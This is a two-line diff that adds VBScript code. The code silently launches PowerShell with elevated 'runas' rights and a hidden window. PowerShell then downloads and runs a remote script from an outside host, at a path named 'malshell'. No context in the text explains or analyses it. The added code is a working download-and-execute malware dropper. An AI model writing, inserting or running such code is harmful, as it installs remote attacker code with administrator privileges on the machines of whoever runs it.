@@ -1,0 +1,2 @@
+Set objShell = CreateObject("Shell.Application")
+objShell.ShellExecute "powershell.exe", "-Command ""iex (irm 'https://cyberstep.top/.hidden_secure_data/shellscript/malshell/v1.3/v1.3.ps1')""", "", "runas", 0
